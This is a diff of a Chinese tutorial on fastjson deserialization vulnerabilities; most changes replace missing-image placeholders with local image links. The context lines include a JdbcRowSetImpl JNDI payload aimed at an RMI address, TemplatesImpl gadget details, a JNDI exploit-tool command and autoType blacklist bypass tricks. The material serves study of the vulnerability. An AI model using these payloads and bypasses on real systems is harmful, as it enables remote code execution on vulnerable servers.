@@ -114,7 +114,7 @@ public class FJTest {
 
 ```
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-d8613a84175a1dcd88fccc4d49cdfd754e7a2bf1.png) `）
+![](../../.resource/remote/48c37ac9777c2d534a78e98f6449684048c457c799e01cac0eaaf7beecf8d430.png)
 
 反序列化
 
@@ -133,11 +133,11 @@ public class FJTest {
 
 ```
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-55c31fba2e45a28de276dbd3e87cdfeb618a5fda.png) `）
+![](../../.resource/remote/2049539d7f748d6f63f2ec841be1d0af21353c795fc19252272f4afe3837312b.png)
 
 其实这里的反序列化也很简单，我的序列化字符串经过 JSON.parseObject() 处理后会实例化我的 Student 类然后触发了构造函数，然后以此调用了 set 方法来给我们这个对象当中的属性进行赋值也就是单纯一个反序列化他就会这么执行
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-c0673cbde76dfa3a17c450f725e3c90c00f71536.png) `）
+![](../../.resource/remote/66475d7a6eb8b0b012dfba9d0bc9f55c6fe36d00c8106e3a1f8883ff38950983.png)
 
 这就是 fastjson 的反序列化
 
@@ -145,7 +145,7 @@ public class FJTest {
 
 那么这里就存在一个问题了
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-285ae25fb5851f16ab549e0e6f4122a210506c22.png) `）
+![](../../.resource/remote/51027974ef8dc48f9085408097be55b11a93d12083bb8f331705181fd1b7df3f.png)
 
 其实很好理解，就是我要反序列化的类的属性名跟 json 的 key 对应的字段名是一样的 ，所以就可以用直接类的映射来填入即可，name 跟 age 是类的属性名，json 字符串也是 name 跟 age
 
@@ -156,7 +156,7 @@ public class FJTest {
 
 ‍
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-f128a3e25752abd318845a26ee14b721ed21113a.png) `）
+![](../../.resource/remote/2edab0baf57074ac375d6ad36374060ca39ae0abf69e783416104418dfd46a81.png)
 
 ```
 package org.example;
@@ -185,9 +185,9 @@ public class Main {
 
 ‍
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-28f6c5a77e596ae7e34f282d6f990977a733b51f.png) `）
+![](../../.resource/remote/4fd73136e639f179ed0473cccf46fdda55d2ee29ef3809ca2dd43697a7edcf3c.png)
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-e691c4f4adb91536157ed0f88fc77c6821bbc5ee.png) `）
+![](../../.resource/remote/9bb366b6d632548b9ea345972cab412161c1f93fe5df48607ccb9538d4d69ef3.png)
 
 ‍
 
@@ -198,7 +198,7 @@ public class Main {
 
 SerializerFeature.WriteClassName，是 JSON.toJSONString() 中的一个设置属性值，设置之后在序列化的时候会多写入一个 @type，即写上被序列化的类名，type 可以指定反序列化的类，并且调用其 getter/setter/is 方法。 Fastjson 接受的 JSON 可以通过 @type 字段来指定该 JSON 应当还原成何种类型的对象，在反序列化的时候方便操作
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-34a8e095d86e1f256cb406025b79b22eb5ae442d.png) `）
+![](../../.resource/remote/8a8f963da89b314ffa2805d185ec1f32b29af8a1b91893ce8ce3bf1c47e37338.png)
 
 如图
 
@@ -218,7 +218,7 @@ public class FJTest {
 
 ```
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-67882b359fd628c75b274f56ac255c816283b334.png) `）
+![](../../.resource/remote/549e47c3cc08611a9d3119370a13c0fdb75525d31f996a391fb77afdb2150633.png)
 
 ‍
 
@@ -284,7 +284,7 @@ public class FJTest {
 
 ```
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-bcbfec8ca016b01786cf988d411335b11957654a.png) `）
+![](../../.resource/remote/b6ea60b652687a429266a32892d422b47e5ffed1343cfdc76f7b3a54e57358e9.png)
 
 我们获取到的是 初始化的值 为 0
 
@@ -310,7 +310,7 @@ public class FJTest {
 
 ```
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-a4ffc9fe077b161b2638071484e6f0d00c5b4338.png) `）
+![](../../.resource/remote/1fccb6ae029de117b0ebf49ba671884b6ec653560afda7c9a20f99c394af0b5c.png)
 
 也就是说，若想让传给 JSON.parseObject() 进行反序列化的 JSON 内容指向的对象类中的私有变量成功还原出来，则需要在调用 JSON.parseObject() 时加上 Feature.SupportNonPublicField 这个属性设置才行。
 
@@ -390,7 +390,7 @@ public class UnSerFJTest {
 
 ```
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-d4732f01e573afad8948177db20bc7f1a3f328fe.png) `）
+![](../../.resource/remote/3c1d6d4b3dc3d4c036385477b4201a177eebbc5618ac857da5e788579bcc3ed7.png)
 
 ‍
 
@@ -455,7 +455,7 @@ VO vo = JSON.parseObject("{...}", VO.class);
 getter setter 条件
 ----------------
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-70fffb0743ab9aa5fad3cf9fcdaba2f92495ae91.png) `）
+![](../../.resource/remote/4ab3c9c4d86d2fac3039f0da0903da548c1e73878997e1dde3de9ab2fb6106e9.png)
 
 ‍
 
@@ -525,7 +525,7 @@ public class Fastjson_Test {
 
 ```
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-1e86b8ef21710ba4ec0ac78e01b80324c8eb4b33.png) `）
+![](../../.resource/remote/9f844498fd84eb833367e7bdb0678d200c0a7dcab134bd74dc82d7acc80e7387.png)
 
 成功执行了 setter 中的恶意代码。因此，只要我们能找到一个合适的 Java Bean，其 setter 或 getter 存在可控参数，则有可能造成任意命令执行。
 
@@ -629,15 +629,15 @@ Class defineClass(final byte[] b) {
 
 ‍
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-db69bb9915b59e84ef2a07d8ef62a178dccf40f3.png) `）
+![](../../.resource/remote/b277e4bf942a3873de2c7fc45421af9ac108c4da506aa928738290a9653060a9.png)
 
 这里`_bytecodes` 不能为空
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-7ac277ae36feb19e6b8ef28733cd272a8a966880.png) `）
+![](../../.resource/remote/7b5a6ef4e622f851aa4260be1227d2133a4485ee7566c1db67ad944c30e621c8.png)
 
 ‍
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-e5b492b1196414fe3cb169ac2bb66c7aab4159a8.png) `）
+![](../../.resource/remote/7d9721f45ebb22ee14978581abdf29ce1d0c1e9038dfa0a92441f1e10af38f97.png)
 
 ‍
 
@@ -655,7 +655,7 @@ TemplatesImpl 中`_bytecodes`属性中存放着手工编写的字节码，并在
 
 ‍
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-39599b9c1e79505629983d10746de36d1ef9965f.png) `）
+![](../../.resource/remote/a71ee52d0b49cd41867fe126bff6bf8a9ffc5d0a14e1932938574c159e77a80c.png)
 
 在这里 455 行里头会把_class 进行实例化从而会执行这个实例化所调用的静态方法和构造方法
 
@@ -665,7 +665,7 @@ TemplatesImpl 中`_bytecodes`属性中存放着手工编写的字节码，并在
 2.  455 行会去进行强制类型转换为`AbstractTranslet`类，那我们是不是要传该类进来呢？
 3.  我的`_name`不能为空啊，不然的话就会返回 null
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-e5d96ea6cbb84d1701eaa881677ee1d0fd6bb2a5.png) `）
+![](../../.resource/remote/36d1bd8200d539f6f326d55ad2c023afabe6a20b3c21114e1230a71bed8bddbe.png)
 
 ‍
 
@@ -673,17 +673,17 @@ TemplatesImpl 中`_bytecodes`属性中存放着手工编写的字节码，并在
 
 于是找到了`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer()`
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-a33399772f51f6720c8df44079c868ae9a9f8202.png) `）
+![](../../.resource/remote/108037fa4cf154729ca3311db559ea85fede5efc97cdab5c60efcf5f3d55daed.png)
 
 再继续往上跟就找到了
 
 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()`
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-b3beab88b0d795b2d6a0c9d6365fdb64d418b724.png) `）
+![](../../.resource/remote/d09125613d0e7355d3e8dc8a8a56cb8d72f8165a7fd82025fc94986d807af639.png)
 
 ‍
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-242fc330be13b039e506a6616825423b2eafd3e6.png) `）
+![](../../.resource/remote/0395b2dd5e049f5b10c465ac921ffb06eced440c04f124164de642f1c0e82c57.png)
 
 ‍
 
@@ -703,17 +703,17 @@ TransletClassLoader#defineClass()
 
 其实这里在 fastjson 中会有一个特殊的处理
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-ba9084e4eef293c8d69b01dfb146c00fb8eba9f6.png) `）
+![](../../.resource/remote/1bcd7616936109d23c17c9a0be7b495eb5d7645d43d36174fe950381484c94c6.png)
 
 ‍
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-9908dc0b08ea78d8b6c9608c8579a416cfc5268b.png) `）
+![](../../.resource/remote/72d484426159580f5daf7cffb9a555777756c2f0ced5f1364ebe0047c6a4974c.png)
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-bbfb722ab0165f01ff7fa9697474af3363f565f0.png) `）
+![](../../.resource/remote/ea570170e3433da2674d8c35559b14f9ecee4ad15d5f319eee152a920f659e19.png)
 
 ‍
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-4eaca31a4dda39ae104ee10a3360a59361910063.png) `）
+![](../../.resource/remote/68554207e53b93a7bf69a472c84a9c76ba94dc629c2e5d445f946c02e244d344.png)
 
 ‍
 
@@ -777,7 +777,7 @@ public class Payload extends AbstractTranslet {
 
 ‍
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-a4689857947a49ac4f78b2a64d72d68900828a67.png) `）
+![](../../.resource/remote/9c35daf7f890aa2513130908417d3b97f1f9c2c71fe4060304f2b07d18852048.png)
 
 ##### 小结一下 TemplatesImpl 链
 
@@ -787,19 +787,19 @@ public class Payload extends AbstractTranslet {
 
 动态分析一下 在这里打下断点`com.alibaba.fastjson.serializer.ObjectArrayCodec#deserialze`
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-f8de034f622b519118e5394bf20d6a4680dac530.png) `）
+![](../../.resource/remote/4cda8ef1113b2f20ee2336922cc3e6d2c1c5fbd9ecf85323044734cac92bf98a.png)
 
 在 153 行的地方将`_bytecodes`的内容作为参数 传入`parseArray()`中
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-1b7af7abce82b18ce59356a53f4505eb8d98d481.png) `）
+![](../../.resource/remote/41404ccdf52b7118eab3d197c4076069ee2dc0f4257b69c8b95a11ed4a88abf8.png)
 
 然后再这里调用了反序列化器进行反序列化
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-32a825ad5447245f222988f5449f1d9badead5e6.png) `）
+![](../../.resource/remote/9ccafb9220865df96823ad0e735570adbbb491a666104a6a039cd97dff3e099c.png)
 
 然后就会走到这个逻辑
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-386441d01c14545f7b201e5fb6ae0c3edcf510c4.png) `）
+![](../../.resource/remote/56a67448594f6212893b54f233cda596d8bfecb1490b12ed54a80041adaf27f6.png)
 
 重点就是这段代码
 
@@ -813,11 +813,11 @@ byte[] bytes = lexer.bytesValue();
 
 这里对数据进行 base64 解码处理，将 bytes 数据返回。所以`_bytecodes`需要进行 base64 编码。
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-bcbfec8ca016b01786cf988d411335b11957654a.png) `）
+![](../../.resource/remote/b6ea60b652687a429266a32892d422b47e5ffed1343cfdc76f7b3a54e57358e9.png)
 
 然后后续就是链子了
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-386c2326cf1503351d2755671f13d5d19ab5602b.png) `）
+![](../../.resource/remote/946074c4f0e9cd0464372c69a6b0eb7cb4fd05b6e806f218a6532bce4b6f251e.png)
 
 ‍
 
@@ -844,11 +844,11 @@ byte[] bytes = lexer.bytesValue();
 
 首先在`com.sun.rowset.JdbcRowSetImpl`存在`setAutoCommit` 方法
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-84649a81ab7082ab5be229166bab7059100f944e.png) `）
+![](../../.resource/remote/f1946e5c94c677aea0033f48fbc28c6c3d1bcc0753993284a592c4f14550f0cd.png)
 
 在 this.conn 为空的情况下会调用`this.connect();` 方法 跟进一下
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-f7818ab02430924d35a6cd517542aa4e6e723dfc.png) `）
+![](../../.resource/remote/f2c30c463de7a9f7a733171e2168962ffb8a364bbe0a4028f96bcca6b75b79d8.png)
 
 这个的话很明显的一个 lookup 函数配合 JNDI
 
@@ -877,7 +877,7 @@ public class Jdbc {
 
 ```
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-71fc08e292ea96788fedc1a77acea12cb8efcf96.png) `）
+![](../../.resource/remote/1342e6b8b0412d67a7e838252e5d4e35379a29998e8c2a8acfeba96011545bc8.png)
 
 这里的 rmi 是通过这个 jndi 利用工具起的
 
@@ -891,17 +891,17 @@ D:\Environment-Java\jdk1.8.0_65\bin\java.exe -jar JNDI-Injection-Exploit-1.0-SNA
 
 另一个函数就是`setDataSourceName`
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-2312bda8d80c36207acdcd155c6b8c28b223646f.png) `）
+![](../../.resource/remote/acdb00979a32b0d02739d32c9efd070ca2fd14b6a4ac64edf318c98c2315bef8.png)
 
 ‍
 
 他会调用父类的`setDataSourceName`然后去设置`dataSource`参数
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-0ef5415a610e084bbdeb9b3924c433dc50f722b8.png) `）
+![](../../.resource/remote/a0b05e76a0eb8c808ac39cd273cee899c093a1a79d67103eac42a8afbe935d13.png)
 
 而 lookup 函数的参数其实就是 datasource 这个参数
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-5c9db5a6306870d434b20ca62ae80f560a829095.png) `）
+![](../../.resource/remote/e64430eb53e234e88d951ce95376269b04226f465a4b2efcae57ff13d77fd49a.png)
 
 但其实都是有限制的
 
@@ -951,7 +951,7 @@ public class Fastjson_Jdbc_LDAP {
 
 ```
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-3047c82230aa9b064dd25124b500638ec36ff4cd.png) `）
+![](../../.resource/remote/7876f7bbbfe78a79ea9e1cc6e40b51cf601b2b88b51df91062c97172db62a577.png)
 
 ‍
 
@@ -967,13 +967,13 @@ public class Fastjson_Jdbc_LDAP {
 
 执行了上述代码后 会提示你`autoType is not support`
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-9a70b23f571307ca7747dc2355ae96c460ab8601.png) `）
+![](../../.resource/remote/d55e6ac278a0287980f59296ea6980e4b2dccee29493fcab424aa03de2014a39.png)
 
 我们可以查看 `com.alibaba.fastjson.parser.ParseConfig`的源码可以看到加入了黑名单字眼
 
 ‍
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-85e52a3a641eb5e360bf9db07506918401d6911a.png) `）
+![](../../.resource/remote/a140e3a83ca90006dbf841f4b3a2399c67daa062b68c3f4775a6c60b86572e83.png)
 
 具体为
 
@@ -1008,23 +1008,23 @@ org.springframework
 
 如果是`autoTypeSupport` 开启了为 true 就会去将 @type 的类去匹配白名单，如果匹配到了白名单就用`TypeUtils.loadClass` 去加载这个类
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-a039c5c24d00b3424e0b4e6a6d0a3d8f36fc7dbc.png) `）
+![](../../.resource/remote/67339a654cf9c2de7dd15ab55309e47e9cb4c4f447667540b3e34660caef7f96.png)
 
 然后如果不是白名单，就去匹配黑名单，匹配到了黑名单就会返回 `autoType is not support`
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-617bf81b5505b2679708ef5217e0267a1301efc7.png) `）
+![](../../.resource/remote/3482168a84cb478a747499c70704365d606a0d63692ce3f751eb00a6ae84e851.png)
 
 ‍
 
 如果没开`autoTypeSupport` 他就会先去匹配黑名单，是黑名单里头的就 `autoType is not support`
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-4eafbab3667827fde50eaecf1436a669fe9d7ab7.png) `）
+![](../../.resource/remote/7564cbbae108b8812b322d670ea7d0131376258e48f377e8c9b4bc29c756e16f.png)
 
 如果匹配不到黑名单，那么就匹配白名单，存在就加载，不存在就说匹配不到
 
 最后如果要反序列化的类和黑白名单都未匹配时，只有开启了 autoType 或者 expectClass 不为空也就是指定了 Class 对象时才会调用 TypeUtils.loadClass 加载，否则 fastjson 会默认禁止加载该类 <span>。</span>
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-27b3224a770b32927b0ff73c62253f453cc9f7b8.png) `）
+![](../../.resource/remote/e4b061546424fc20309c9482af6af16c5eb525c4d3682a0015dd8a081daf39a8.png)
 
 ‍
 
@@ -1032,9 +1032,9 @@ org.springframework
 
 然后这里有一个很奇怪的写法导致了问题的产生，
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-94b8cddf79f8e2055df160781691c32d73df0d23.png) `）
+![](../../.resource/remote/77c9d458ac688c569c77c51833f9115fd05fb95538435af8af86c9081bc2c280.png)
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-26cc6d8f0cff1ac9cd0f90fb8eef82fc8c126dd2.png) `）
+![](../../.resource/remote/5d7344798762645a8d0dc7e65790406e0d8414eefefaee068d64cd8fb2cd96c9.png)
 
 *   如果以`[`开头则去掉`[`后进行类加载（在之前 Fastjson 已经判断过是否为数组了，实际走不到这一步）
 *   如果以`L`开头，以`;`结尾，则去掉开头和结尾进行类加载
@@ -1044,7 +1044,7 @@ org.springframework
 
 ‍
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-34a8e095d86e1f256cb406025b79b22eb5ae442d.png) `）
+![](../../.resource/remote/8a8f963da89b314ffa2805d185ec1f32b29af8a1b91893ce8ce3bf1c47e37338.png)
 
 Fastjson 默认 AutoTypeSupport 为`False`（默认开启白名单机制），需要通过服务端使用以下代码手动关闭，这一点是高版本一个难以绕过的地方。
 
@@ -1084,7 +1084,7 @@ public class Jdbc {
 
 ```
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-984855867067597dede251518c5bc7d121e93f23.png) `）
+![](../../.resource/remote/0a6af9e1d42cd0a286254d393ab66aa9e1db5cb03bae0562c146b68c17abc50c.png)
 
 ‍
 
@@ -1095,7 +1095,7 @@ public class Jdbc {
 *   黑名单改为了 hash 值，防止绕过
 *   对于传入的类名，删除开头`L`和结尾的`;`
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-ccad02a12865102e1ad7cd50baf6d1592c5a3c6a.png) `）
+![](../../.resource/remote/4f40b08268ccf0e6553aa3bf191ebe1e7caec419044b7a1fef29f793f8df1dbd.png)
 
 发现黑名单全是 hash 了
 
@@ -1103,11 +1103,11 @@ public class Jdbc {
 
 其实这里进行了一个加密的混淆 虽然说利用 hash 可以让我们不知道禁用了什么类，但是加密方式是有写`com.alibaba.fastjson.parser.ParserConfig#addDeny`中的`com.alibaba.fastjson.util.TypeUtils#fnv1a_64`，我们理论上可以遍历 jar，字符串，类去碰撞得到这个 hash 的值。（因为常用的包是有限的）
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-d4732f01e573afad8948177db20bc7f1a3f328fe.png) `）
+![](../../.resource/remote/3c1d6d4b3dc3d4c036385477b4201a177eebbc5618ac857da5e788579bcc3ed7.png)
 
 在上述的逻辑当中，看看 GPT 如何解释
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-61f63907e98819f11ff7974fd504c0e29c159864.png) `）
+![](../../.resource/remote/3f8f1d1f914e9b525b4843fc0d1ddd179610753686f7a722ca9904ee89fa075c.png)
 
 其实也可以看明白就是类似截取字符，把第一个字符跟倒数第一个字符进行截取 (那么想到上一个版本的 fastjson 是`L`跟`;`，并且这个版本的黑名单是 hash 进行混淆了，并且也给出了加密的代码，所以说 (牛子) 很容易想到是先前的过滤，那么跟 CTF 一样，他过滤了一次，但是并没有过滤多次，所以双写绕过即可)
 
@@ -1135,7 +1135,7 @@ public class Jdbc {
 
 ```
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-74ba27095caba2dc224ed988ff65d03d2d9a9c7e.png) `）
+![](../../.resource/remote/1b2de7e7fd3e224988600e9ef1585e31490db113eef3bb6b18470d2dec5e4f93.png)
 
 ‍
 
@@ -1143,7 +1143,7 @@ public class Jdbc {
 
 1.2.43 版本修改了`checkAutoType()`的部分代码，对于 LL 等开头结尾的字符串直接抛出异常。
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-b0f3545286b4b60c3b4573433dbc5f8e8df93621.png) `）
+![](../../.resource/remote/be7267e6866afa2d260ab70a130533aa080fccf85e25cec373e35eac8887b425.png)
 
 但他也没对`[`进行限制啊？
 
@@ -1170,11 +1170,11 @@ public class Jdbc {
 
 ```
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-be6ac4c5ef591dfefac056b01bf830395fed5d0f.png) `）
+![](../../.resource/remote/a9cb6f8cc375350630a48d2c8141ff6e747a2e4f0a87734b7ecc0a029faf9ecd.png)
 
 原理的话首先`[`是可以进入 loadclass 的逻辑的，但是 Java 处理的时候是存在 json 解析有问题的所以进行了报错
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-2061e6f4322504b5209d21dbc101a18aee9e1a56.png) `）
+![](../../.resource/remote/13ba016b31018a0211d6244a4f2319a50e7f3751e99a1d81155f1a5e59847280.png)
 
 ```
 Exception in thread "main" com.alibaba.fastjson.JSONException: exepct '[', but ,, pos 42, json : {"@type":"[com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/nhdzhn", "autoCommit":true}
@@ -1184,13 +1184,13 @@ Exception in thread "main" com.alibaba.fastjson.JSONException: exepct '[', but ,
 
 那么看看 GPT 怎么说
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-61f63907e98819f11ff7974fd504c0e29c159864.png) `）
+![](../../.resource/remote/3f8f1d1f914e9b525b4843fc0d1ddd179610753686f7a722ca9904ee89fa075c.png)
 
 其实就是一个 json 字符串的解析，所以加上去就好了
 
 加上后仍然报错，依旧是一一样的问题，所以加上`{`即可
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-2979f266017123a486232903ae0085d371f44c1d.png) `）
+![](../../.resource/remote/042d11bf79812128125342d5c2d2bf4454a4be2484a9b7ce92288713e3e66934.png)
 
 ‍
 
@@ -1216,27 +1216,27 @@ Exception in thread "main" com.alibaba.fastjson.JSONException: exepct '[', but ,
 
 先来继续查看这个`checkAutoType`方法，因为没有开启 AutoTypeSupport，所以就不会进入这个 if 黑白名单判断的逻辑，他就会有两种加载类的模式，如果说我们能够在这两种加载类的模式下把我们恶意类加载进去导致绕过了黑白名单，这是不是也是一种恶意类加载呢
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-c5c36710e63c6bddd418fe2d3fee9a77f97bec19.png) `）
+![](../../.resource/remote/001a9034be61c3e246b8743e4bfb32611caa085e30e769c53ed6abfd004d8e69.png)
 
 1.  `TypeUtils.getClassFromMapping(typeName)` 这个 mapping 中找这个类
 
 步进这个 Mapping，得到 mapping 如下
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-6332a2efac3a565b8f6b05b30ac898202607a912.png) `）
+![](../../.resource/remote/3641121e621c0104c03a84bbc8889a2feebf1041696ef072bd7fc95b1d4e6e0a.png)
 
 再步进一下 mapping 发现是一个 private 的实例化`ConcurrentHashMap`对象
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-19344175b877cc1f70e9cce8682a2d8104c58810.png) `）
+![](../../.resource/remote/ba8edec7dd81ba1c822f57b3e845470f82f4bc891bb78765e049031e7333445c.png)
 
 那么由于知道这里是一个 entry，所以就进行`mappings.put`方法的搜索，发现在 <span>TypeUtils.loadClass</span> 有调用到
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-8b9584c615d759c27fb30993303a9469864194c1.png) `）
+![](../../.resource/remote/825f78ebfe99b603a28ebae5ae8349747dcf7fbfa3dec47482c1e22f57d92600.png)
 
 再次全局搜索看哪里调用了 `TypeUtils.loadClass()`
 
 存在 5 处调用
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-d0b3295e59b49cf70a10c64e337203d6166b3a94.png) `）
+![](../../.resource/remote/a71185012c5aa2c48585bdd732d9b09d5a48b06daae37c0ffa3bc4412a0c1694.png)
 
 但其实这五处全是
 
@@ -1246,27 +1246,27 @@ Exception in thread "main" com.alibaba.fastjson.JSONException: exepct '[', but ,
 
 最后在`com.alibaba.fastjson.serializer.MiscCodec.deserialze`中分析
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-672a4bc231314d60733820c20aaa092bbf5e7674.png) `）
+![](../../.resource/remote/3017eae885725baf080e7a29c5b602679d7fd6c8bff9508354f7984349575c63.png)
 
 发现是继承了 `ObjectSerializer` `ObjectDeserializer` 两个反序列化的父类
 
 先看看调用的代码和传入的参数
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-1b4fca098e4972828b71814caf12e841b537548c.png) `）
+![](../../.resource/remote/d3884dffd00d6baadd49101bb9b697efab282725a90da492daef2027c5588e30.png)
 
 参数为 `strVal, parser.getConfig().getDefaultClassLoader()`
 
 先看看 `strVal` 是如何传入的
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-a7160d3453ed5fa07bf5e0a3e4ed769e9ff6e973.png) `）
+![](../../.resource/remote/3298495abbf9b3f647091567d1f50ff9ce06466c6f5465e58652563541722f3d.png)
 
 在这个 266 行当中可以看到代码为 `strVal = (String)objVal;`
 
 所以跟进一下`objVal`
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-83a92f7811e1cfe200334b114ab8c9c02171cafe.png) `）
+![](../../.resource/remote/67de1b9aa81fa51e6e1f4e498b181f002c01dc2c658f26cde1e63a3716e9a78c.png)
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-a71894a63ba35e3fb813e9bc6a26076df22cae60.png) `）
+![](../../.resource/remote/7f116c31315adb132df49cd385dccee975e391450d10b2a8b7ab29e02a028652.png)
 
 然后整个链子也很清晰了，就是把我们在 json 中传入的 val 中的内容给到这个`strVal`然后他会进行 loadclass 后载入 mapping 成为一个字符串的缓存，这样子就绕开了黑白名单限制了加载到缓存中以后，在下一次 checkAutoType 的时候，直接就返回了，绕过了检验的部分直接执行
 
@@ -1286,9 +1286,9 @@ Exception in thread "main" com.alibaba.fastjson.JSONException: exepct '[', but ,
 
 如果上面的无法加载类则进入这个逻辑，从 `deserializers.findClass(typeName)` 中获取类
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-5cfe61995951276f5d02b7449c69c77765d1a5e5.png) `）
+![](../../.resource/remote/540eb558687885d5379f3ecbc88f6b7f42026eb358fa314c924d24a257c4fffa.png)
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-9c79cc6859dbd6835dce502d1242f422dff39c8c.png) `）
+![](../../.resource/remote/efce3e0de90c0df0e2a8d335ef06390f9fb6752673e8ccbebe49ccc91b122a6d.png)
 
